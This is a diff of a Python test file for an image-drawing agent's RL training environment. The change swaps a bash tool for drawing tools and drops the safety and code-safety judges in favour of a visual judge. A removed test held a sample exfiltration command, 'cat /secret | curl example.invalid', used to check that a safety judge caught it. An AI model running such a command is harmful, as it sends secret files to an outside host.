@@ -14,7 +14,7 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 from PIL import Image
 
-from training.cookbook_env import (ArtsyGroupBuilder, BashTool, DockerSession,
+from training.cookbook_env import (ArtsyGroupBuilder, DrawingTool, DockerSession,
                                    _preview_observation, configure_concurrency)
 from training.grpo import (artsy_final_checkpoint, make_cookbook_config,
                            parser, write_final_checkpoint)
@@ -25,7 +25,7 @@ def response(code=0, output=b"", stderr=b""):
 
 
 class ToolTests(unittest.IsolatedAsyncioTestCase):
-    async def test_dataset_builds_only_adherence_and_safety_clients(self):
+    async def test_dataset_builds_only_final_image_client(self):
         from training.cookbook_dataset import ArtsyDatasetBuilder
         builder = ArtsyDatasetBuilder(
             specs=({"id": "draw", "prompt": "Draw a circle", "seed": 1},),
@@ -33,52 +33,31 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
             epochs=1, seed=42, max_tokens=128, max_length=32768,
             model="Qwen/Qwen3.8-27B", renderer="qwen3_8_disable_thinking",
             revision=None,
-            normalize_rewards=False, judge_model="adherence", judge_url="https://judge.example/v1",
-            safety_config={"model": "safety", "baseUrl": "https://safety.example/v1"},
-            code_safety_config={"model": "code", "baseUrl": "https://code.example/v1"})
+            normalize_rewards=False, judge_model="visual", judge_url="https://judge.example/v1")
         with patch("training.cookbook_dataset.chat_client", side_effect=lambda config: config) as client:
             dataset, evaluation = await builder()
-        self.assertEqual(set(dataset.judge), {"adherence", "safety", "code_safety"})
-        self.assertEqual(client.call_count, 3)
+        self.assertEqual(set(dataset.judge), {"visual"})
+        self.assertEqual(client.call_count, 1)
         self.assertIsNone(evaluation)
 
-    async def test_submit_is_the_only_terminating_bash_command(self):
-        configure_concurrency(2, 2)
-        spec = {"id": "draw", "prompt": "Draw a circle", "seed": 42}
-        with tempfile.TemporaryDirectory() as root:
-            session = DockerSession(spec, Path(root), MagicMock())
-            tool = BashTool(session)
+    async def test_tools_use_shared_schemas_and_propagate_termination(self):
+        from drawing.agent_contract import DRAWING_TOOLS
+        session = DockerSession({}, Path('/tmp'), {})
+        session.execute_tool = AsyncMock(side_effect=[('updated', False), ('submitted', True)])
+        tools = {definition['function']['name']: DrawingTool(session, definition['function'])
+                 for definition in DRAWING_TOOLS}
+        self.assertNotIn('bash', tools)
+        for definition in DRAWING_TOOLS:
+            self.assertEqual(tools[definition['function']['name']].to_spec(), definition['function'])
+        result = await tools['update_drawing'].run(SimpleNamespace(arguments={'source': 'draw()'}, call_id='first'))
+        self.assertFalse(result.should_stop)
+        self.assertEqual(result.messages[0]['tool_call_id'], 'first')
+        result = await tools['submit_drawing'].run(SimpleNamespace(arguments={}, call_id='last'))
+        self.assertTrue(result.should_stop)
+        self.assertEqual(result.messages[0]['name'], 'submit_drawing')
+        self.assertEqual(session.execute_tool.call_args.args, ('submit_drawing', {}))
 
-            async def docker(argv, **kwargs):
-                if argv[0] == "run":
-                    return response(output=b"id")
-                if argv[0] == "exec":
-                    return response(output=b"ok")
-                return response()
-
-            tools_module = ModuleType("tinker_cookbook.tool_use.tools")
-            tools_module.simple_tool_result = lambda content, **kw: SimpleNamespace(
-                should_stop=kw.get("should_stop", False),
-                messages=[{"content": content, "tool_call_id": kw["call_id"]}])
-            tools_module.error_tool_result = tools_module.simple_tool_result
-            with patch("training.cookbook_env._docker", new=AsyncMock(side_effect=docker)), \
-                 patch.dict(sys.modules, {"tinker_cookbook": ModuleType("tinker_cookbook"),
-                     "tinker_cookbook.tool_use": ModuleType("tinker_cookbook.tool_use"),
-                     "tinker_cookbook.tool_use.tools": tools_module}):
-                result = await tool.run(SimpleNamespace(
-                    arguments={"command": "echo hello"}, call_id="first"))
-                self.assertFalse(result.should_stop)
-                self.assertEqual(result.messages[0]["tool_call_id"], "first")
-                submitted = await tool.run(SimpleNamespace(
-                    arguments={"command": "echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT"},
-                    call_id="second"))
-                self.assertTrue(submitted.should_stop)
-                self.assertEqual(session.commands, [
-                    "echo hello", "echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT"])
-                await session.close()
-            self.assertIsNone(session.container)
-
-    async def test_adherence_rewards_adjust_existing_totals_without_visual_scoring(self):
+    async def test_combined_rewards_adjust_existing_totals(self):
         spec = {"id": "draw", "prompt": "Draw a circle", "seed": 1}
         judge = {"visual": SimpleNamespace(compare=AsyncMock(side_effect=["A", "B"]))}
         with tempfile.TemporaryDirectory() as root:
@@ -87,75 +66,57 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
                 session = DockerSession(spec, Path(root) / str(index), judge)
                 session.submitted = True
                 session.png = b"image" + bytes([index])
-                session.result = {"unsafe": False, "scores": {"render_valid": 1.0, "adherence": (index + 1) / 4}}
+                session.result = {"scores": {"render_valid": 1.0, "adherence": (index + 1) / 4, "visual_quality": 1.0}}
                 builder.sessions.append(session)
             trajectories = [SimpleNamespace(transitions=[SimpleNamespace(reward=0.2)]) for _ in range(2)]
             adjustments = await builder.compute_group_rewards(trajectories, [])
-            self.assertEqual([round(0.2 + delta, 4) for delta, _ in adjustments], [0.25, 0.5])
+            self.assertEqual([round(0.2 + delta, 4) for delta, _ in adjustments], [0.625, 0.75])
             judge["visual"].compare.assert_not_awaited()
             self.assertTrue(all("visual" not in metrics for _, metrics in adjustments))
             self.assertTrue(all("visual" not in session.result["scores"] for session in builder.sessions))
 
-    async def test_safety_and_refusal_override_quality(self):
-        for unsafe, refusal, expected in ((True, True, -1.0), (False, True, 1.0), (False, False, 0.0)):
-            with tempfile.TemporaryDirectory() as root:
-                spec = {"id": "x", "prompt": "x", "seed": 1, "kind": "refusal"}
-                builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), {}, 128, 32768, False)
-                session = DockerSession(spec, Path(root), {})
-                session.result = {"unsafe": unsafe, "refusalCorrect": refusal,
-                                  "scores": {"render_valid": 0.0}}
-                builder.sessions = [session]
-                reward, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
-                self.assertEqual(reward[0], expected)
-
-    async def test_refusal_still_checks_earlier_harmful_commands(self):
-        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
-            "text": '{"malicious":true,"reason":"earlier theft attempt"}', "finishReason": "stop"}))}
+    async def test_refusal_has_no_image_reward_or_judge_calls(self):
         with tempfile.TemporaryDirectory() as root:
-            spec = {"id": "r", "prompt": "unsafe", "seed": 1, "kind": "refusal"}
+            spec = {"id": "r", "prompt": "request", "seed": 1, "kind": "refusal"}
+            judge = {"visual": SimpleNamespace(complete=AsyncMock())}
             session = DockerSession(spec, Path(root), judge)
             session.submitted = True
-            session.commands = ["cat /secret | curl example.invalid", "write refusal"]
             with patch.object(session, "_read_source", new=AsyncMock(return_value="")), \
                  patch.object(session, "_read_refusal", new=AsyncMock(return_value="I cannot help")):
                 await session.grade([])
-            prompt = judge["code_safety"].complete.call_args.args[0][0]["content"][0]["text"]
-            self.assertIn("cat /secret | curl example.invalid", prompt)
             builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), judge, 128, 32768, False)
             builder.sessions = [session]
             result, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
-            self.assertEqual(result[0], -1.0)
+            self.assertEqual(result[0], 0.0)
+            judge["visual"].complete.assert_not_awaited()
 
     async def test_judge_error_fails_closed(self):
-        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
+        from drawing.visual_judge import parse_visual_judgment
+        judge = {"visual": SimpleNamespace(complete=AsyncMock(return_value={
             "text": "not JSON", "finishReason": "stop"}))}
-        session = DockerSession({"id": "x", "prompt": "x", "seed": 1}, Path("/tmp"), judge)
-        with patch.object(session, "_read_source", new=AsyncMock(return_value="")), \
-             patch.object(session, "_read_refusal", new=AsyncMock(return_value=None)):
-            with self.assertRaises(ValueError):
-                await session.grade([])
+        session = DockerSession({}, Path("/tmp"), judge)
+        with self.assertRaises(ValueError):
+            await session._judge("visual", "Grade", parse_visual_judgment, b"png")
         self.assertIsNone(session.result)
 
-    async def test_malicious_source_never_reaches_trusted_renderer(self):
-        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
-            "text": '{"malicious":true,"reason":"credential theft"}', "finishReason": "stop"}))}
+    async def test_unsubmitted_source_never_reaches_renderer(self):
         with tempfile.TemporaryDirectory() as root:
-            session = DockerSession({"id": "x", "prompt": "Draw", "seed": 1}, Path(root), judge)
-            with patch.object(session, "_read_source", new=AsyncMock(return_value="steal()")), \
+            session = DockerSession({"id": "x", "prompt": "Draw", "seed": 1}, Path(root), {})
+            with patch.object(session, "_read_source", new=AsyncMock(return_value="draw()")), \
                  patch.object(session, "_read_refusal", new=AsyncMock(return_value=None)), \
                  patch("training.cookbook_env._docker", new=AsyncMock()) as docker:
                 await session.grade([])
             docker.assert_not_awaited()
-            self.assertTrue(session.result["unsafe"])
+            self.assertEqual(session.result["scores"]["render_valid"], 0.0)
             self.assertIsNone(session.png)
 
     async def test_native_judge_uses_configured_reasoning_budget(self):
-        from drawing.judges import parse_adherence_rubric
+        from drawing.visual_judge import parse_visual_judgment
         client = SimpleNamespace(max_tokens=16384, complete=AsyncMock(return_value={
-            "text": '{"score":4,"reason":"All requested elements"}', "finishReason": "stop"}))
-        session = DockerSession({}, Path("/tmp"), {"adherence": client})
-        result = await session._judge("adherence", "Grade", parse_adherence_rubric)
-        self.assertEqual(result["score"], 4)
+            "text": '{"adherence_score":4,"visual_quality_score":2,"comments":"All requested elements"}', "finishReason": "stop"}))
+        session = DockerSession({}, Path("/tmp"), {"visual": client})
+        result = await session._judge("visual", "Grade", parse_visual_judgment)
+        self.assertEqual(result["adherence_score"], 4)
         self.assertEqual(client.complete.call_args.args[1], 16384)
 
     async def test_unsubmitted_image_gets_zero_reward_without_visual_judge(self):
@@ -167,7 +128,7 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
                 session = DockerSession(spec, Path(root) / str(index), judge)
                 session.submitted = index == 0
                 session.png = b"image"
-                session.result = {"unsafe": False, "scores": {"render_valid": 1., "adherence": 1.}}
+                session.result = {"scores": {"render_valid": 1., "adherence": 1., "visual_quality": 1.}}
                 builder.sessions.append(session)
             adjustments = await builder.compute_group_rewards(
                 [SimpleNamespace(transitions=[]) for _ in range(2)], [])
@@ -179,14 +140,13 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
         png_file = BytesIO()
         Image.new("RGB", (1920, 1200)).save(png_file, "PNG")
         png = png_file.getvalue()
-        judge = {role: SimpleNamespace(complete=AsyncMock(return_value={
-            "text": json.dumps(value), "finishReason": "stop"})) for role, value in (
-                ("adherence", {"score": 3, "reason": "Looks right"}),
-                ("safety", {"harmful": False, "reason": "Safe image"}),
-                ("code_safety", {"malicious": False, "reason": "Safe code"}))}
+        judge = {"visual": SimpleNamespace(complete=AsyncMock(return_value={
+            "text": json.dumps({"adherence_score": 3, "visual_quality_score": 2,
+                                "comments": "Looks right but rough"}), "finishReason": "stop"}))}
         with tempfile.TemporaryDirectory() as root:
             session = DockerSession(spec, Path(root), judge)
             session.container = "fake-container"
+            session.submitted = True
 
             async def docker(argv, **kwargs):
                 if argv[0] == "exec" and "refusal.json" in argv[-1]:
@@ -201,27 +161,24 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
                     }).encode())
                 return response()
 
-            image_judges_started = set()
-            both_started = asyncio.Event()
-            original_judge = session._judge
-
-            async def concurrent_judge(role, *args, **kwargs):
-                if role in {"safety", "adherence"}:
-                    image_judges_started.add(role)
-                    if len(image_judges_started) == 2:
-                        both_started.set()
-                    # Sequential judging would time out here.
-                    await asyncio.wait_for(both_started.wait(), timeout=1)
-                return await original_judge(role, *args, **kwargs)
-
-            with patch("training.cookbook_env._docker", new=AsyncMock(side_effect=docker)), \
-                 patch.object(session, "_judge", side_effect=concurrent_judge):
+            with patch("training.cookbook_env._docker", new=AsyncMock(side_effect=docker)):
                 reward, metrics = await session.grade([])
             self.assertEqual(reward, 0.0)
             self.assertEqual(metrics["render_valid"], 1.0)
             self.assertEqual((Path(root) / "image.png").read_bytes(), png)
             self.assertEqual(json.loads((Path(root) / "result.json").read_text())
                              ["scores"]["adherence"], 0.75)
+            self.assertEqual(session.result["scores"]["visual_quality"], 0.5)
+            builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), judge, 128, 32768, False)
+            builder.sessions = [session]
+            adjustment, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
+            self.assertEqual(adjustment[0], 0.625)
+            self.assertEqual(json.loads((Path(root) / "result.json").read_text())["scores"]["reward"], 0.625)
+            judge["visual"].complete.assert_awaited_once()
+            content = judge["visual"].complete.call_args.args[0][0]["content"]
+            self.assertIn(spec["prompt"], content[0]["text"])
+            self.assertEqual(content[1]["image_url"]["url"],
+                             "data:image/png;base64," + base64.b64encode(png).decode())
 
 
 class PreviewTests(unittest.TestCase):
@@ -346,7 +303,7 @@ class ConfigurationTests(unittest.TestCase):
                 "tokenizer_revision": None,
                 "lora_rank": 32, "correctness_judge_model": "judge",
                 "correctness_judge_url": "https://judge.example/v1",
-                "safety_config": {}, "code_safety_config": {}}
+                }
         config = make_cookbook_config(
             args, [{"id": "a", "prompt": "Draw a circle", "seed": 1}], plan, 1)
         self.assertEqual(config.loss_fn, "ppo")
@@ -407,25 +364,24 @@ class ToolBudgetTests(unittest.IsolatedAsyncioTestCase):
             wrapped, = await builder.make_envs()
         env = wrapped.message_env
         env.reward_fn = AsyncMock(return_value=(0.0, {}))
-        builder.sessions[0].execute = AsyncMock(return_value=('ok', False))
+        builder.sessions[0].execute_tool = AsyncMock(return_value=('ok', False))
         history = await env.initial_observation()
         self.assertEqual(history[-1]['content'], 'Turn 1 of 3.')
         await env.initial_observation()
         self.assertEqual(len(history), 1)
         result = await env.step({'role': 'assistant', 'content': '', 'tool_calls': [
             ToolCall(id='one', function=ToolCall.FunctionBody(
-                name='bash', arguments=json.dumps({'command': 'true'})))]})
+                name='read_drawing', arguments='{}'))]})
         self.assertFalse(result.episode_done)
         self.assertEqual(result.next_messages[-1]['content'], 'Turn 2 of 3.')
         result = await env.step({'role': 'assistant', 'content': 'thinking'})
         self.assertFalse(result.episode_done)
-        self.assertIn('Every response must contain a bash tool call', result.next_messages[-2]['content'])
+        self.assertIn('Every response must contain a drawing tool call', result.next_messages[-2]['content'])
         self.assertEqual(result.next_messages[-1]['content'],
                          'Turn 3 of 3. This is your final turn; submit your final output now.')
-        builder.sessions[0].execute.return_value = ('submitted', True)
+        builder.sessions[0].execute_tool.return_value = ('submitted', True)
         result = await env.step({'role': 'assistant', 'content': '', 'tool_calls': [
-            ToolCall(id='last', function=ToolCall.FunctionBody(name='bash', arguments=json.dumps({
-                'command': 'echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT'})))]})
+            ToolCall(id='last', function=ToolCall.FunctionBody(name='submit_drawing', arguments='{}'))]})
         self.assertTrue(result.episode_done)
         self.assertFalse(any('Turn 4' in str(m.get('content')) for m in result.next_messages))
         env.reward_fn.assert_awaited_once()
@@ -435,12 +391,12 @@ class ToolBudgetTests(unittest.IsolatedAsyncioTestCase):
         with tempfile.TemporaryDirectory() as root:
             session = DockerSession({'prompt': 'Draw a disk', 'seed': 1}, Path(root), {})
             session.container = 'fake-container'
-            reply = SimpleNamespace(stdout=b'', stderr=b'', returncode=0)
+            reply = SimpleNamespace(stdout=b'draw()', stderr=b'', returncode=0)
             with patch('training.cookbook_env._docker', new=AsyncMock(return_value=reply)) as docker:
                 for index in range(40):
-                    _, done = await session.execute('true')
+                    _, done = await session.execute_tool('read_drawing', {})
                     self.assertFalse(done)
-                _, done = await session.execute('echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT')
+                _, done = await session.execute_tool('submit_drawing', {})
                 self.assertTrue(done)
                 self.assertEqual(docker.await_count, 41)
                 self.assertTrue(session.submitted)
@@ -453,17 +409,13 @@ class RolloutPromptTests(unittest.TestCase):
         with patch('training.cookbook_env.encoder', return_value=SimpleNamespace(renderer=renderer)):
             messages = initial_messages({'prompt': 'Draw a disk', 'seed': 1}, [])
         content = messages[-1]['content']
-        from drawing.agent_contract import drawing_system_prompt
-        prompt = ('Draw a disk\n\nPreview with: python /opt/artsy/render.py --seed 1 '
-                  '--output /workspace/preview --preview < /workspace/program.py')
-        expected = (f"System instructions:\n{drawing_system_prompt(token_limit=None)}"
-                    "\n\nYou have 20 model turns to complete this task. "
-                    "Each response uses one turn. Submit your final output by the last turn."
-                    f"\n\nTask:\n{prompt}")
+        from drawing.agent_contract import drawing_tools_prompt, host_user_prompt
+        expected = host_user_prompt(drawing_tools_prompt(), 'Draw a disk', 20)
         self.assertEqual(content, expected)
         self.assertIn('20 model turns', content)
         self.assertIn('Submit your final output by the last turn.', content)
-        self.assertNotIn('20 bash', content)
+        self.assertNotIn('bash', content)
+        self.assertNotIn('/opt/artsy/render.py', content)
         self.assertNotIn('model-turn limit', content)
         self.assertNotIn('32768', content)
         self.assertNotIn('total input and output', content)
@@ -545,6 +497,7 @@ class RolloutResourceTests(unittest.IsolatedAsyncioTestCase):
         configure_concurrency(1, 1)
         session = DockerSession({'id': 'x', 'prompt': 'draw', 'seed': 1}, Path('/tmp'), MagicMock())
         session.container = 'workspace'
+        session.submitted = True
         session._read_source = AsyncMock(return_value='print(1)')
         session._read_refusal = AsyncMock(return_value=None)
         session._judge = AsyncMock(return_value={'malicious': False})
